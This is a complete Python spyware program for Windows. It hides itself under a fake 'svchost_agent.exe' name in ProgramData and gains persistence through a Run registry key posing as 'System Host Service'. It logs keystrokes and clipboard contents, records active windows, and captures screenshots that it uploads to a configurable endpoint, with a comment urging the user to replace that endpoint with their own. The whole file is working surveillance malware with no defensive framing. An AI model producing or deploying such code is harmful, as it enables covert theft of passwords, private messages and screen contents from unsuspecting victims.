import os
import time
import logging
import pyautogui
import requests
import win32clipboard
import win32gui
import win32process
import psutil
import shutil
import sys
import subprocess

from datetime import datetime
from threading import Thread
from pynput import keyboard

# === CONFIG ===
LOG_DIR = "C:\\ProgramData\\syslog"
SCREENSHOT_DIR = os.path.join(LOG_DIR, "screenshots")
KEYLOG_FILE = os.path.join(LOG_DIR, f"keylog_{datetime.now().strftime('%Y-%m-%d')}.txt")
CLIPBOARD_LOG = os.path.join(LOG_DIR, "clipboard_log.txt")
APP_LOG = os.path.join(LOG_DIR, "apps_log.txt")
UPLOAD_ENDPOINT = "http://127.0.0.1:5000/upload"  # Replace with your endpoint IMPORTANT!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
SCREENSHOT_INTERVAL = 30  # seconds
APP_CHECK_INTERVAL = 5    # seconds
CLIPBOARD_INTERVAL = 3    # seconds

# === SELF-INSTALL CONFIG ===
HIDDEN_DIR = "C:\\ProgramData\\SystemService"
INSTALLED_NAME = "svchost_agent.exe"
INSTALLED_PATH = os.path.join(HIDDEN_DIR, INSTALLED_NAME)
REG_NAME = "System Host Service"

# === SETUP ===
os.makedirs(SCREENSHOT_DIR, exist_ok=True)

logging.basicConfig(
    filename=KEYLOG_FILE,
    level=logging.DEBUG,
    format='%(asctime)s: %(message)s'
)

# === SELF-INSTALL ===
def install_to_hidden_location():
    if not os.path.exists(HIDDEN_DIR):
        os.makedirs(HIDDEN_DIR)
    if not os.path.exists(INSTALLED_PATH):
        try:
            shutil.copy2(sys.executable, INSTALLED_PATH)
            print(f"[+] Installed to {INSTALLED_PATH}")
        except Exception as e:
            print(f"[ERROR] Copy failed: {e}")

def set_startup():
    try:
        reg_cmd = f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "{REG_NAME}" /t REG_SZ /d "{INSTALLED_PATH}" /f'
        subprocess.call(reg_cmd, shell=True)
        print(f"[+] Startup entry created: {REG_NAME}")
    except Exception as e:
        print(f"[ERROR] Failed to add startup: {e}")

def is_installed():
    return os.path.abspath(sys.executable).lower() == INSTALLED_PATH.lower()

# === KEYLOGGER ===
def on_press(key):
    try:
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        logging.info(f"Special key: {key}")

def start_keylogger():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

# === SCREENSHOTS ===
def take_screenshot():
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = os.path.join(SCREENSHOT_DIR, f"shot_{timestamp}.png")
    screenshot = pyautogui.screenshot()
    screenshot.save(filename)
    return filename

def upload_file(filepath):
    with open(filepath, 'rb') as f:
        try:
            response = requests.post(UPLOAD_ENDPOINT, files={'file': f})
            return response.status_code == 200
        except Exception as e:
            print(f"[UPLOAD ERROR] {e}")
            return False

def screenshot_loop():
    while True:
        try:
            path = take_screenshot()
            print(f"[+] Screenshot saved: {path}")
            if UPLOAD_ENDPOINT.startswith("http"):
                if upload_file(path):
                    print(f"[+] Uploaded: {path}")
                    os.remove(path)
        except Exception as e:
            print(f"[SCREENSHOT ERROR] {e}")
        time.sleep(SCREENSHOT_INTERVAL)

# === CLIPBOARD LOGGER ===
def clipboard_logger():
    last_text = ""
    while True:
        try:
            win32clipboard.OpenClipboard()
            data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            if data != last_text:
                last_text = data
                with open(CLIPBOARD_LOG, "a", encoding="utf-8") as f:
                    f.write(f"{datetime.now()} - Clipboard: {data}\n")
        except Exception:
            pass
        time.sleep(CLIPBOARD_INTERVAL)

# === APP TRACKER ===
def get_active_window_process_name():
    try:
        hwnd = win32gui.GetForegroundWindow()
        _, pid = win32process.GetWindowThreadProcessId(hwnd)
        process = psutil.Process(pid)
        return process.name(), win32gui.GetWindowText(hwnd)
    except Exception:
        return None, None

def app_tracker():
    last_app = ""
    while True:
        app, title = get_active_window_process_name()
        if app and app != last_app:
            last_app = app
            with open(APP_LOG, "a", encoding="utf-8") as f:
                f.write(f"{datetime.now()} - App: {app} | Title: {title}\n")
        time.sleep(APP_CHECK_INTERVAL)

# === MAIN ENTRY ===
def main():
    if not is_installed():
        install_to_hidden_location()
        set_startup()
        subprocess.Popen([INSTALLED_PATH], shell=True)
        sys.exit(0)

    print("[*] Monitoring agent started.")
    Thread(target=start_keylogger, daemon=True).start()
    Thread(target=screenshot_loop, daemon=True).start()
    Thread(target=clipboard_logger, daemon=True).start()
    Thread(target=app_tracker, daemon=True).start()

    while True:
        time.sleep(1)

if __name__ == "__main__":
    main()
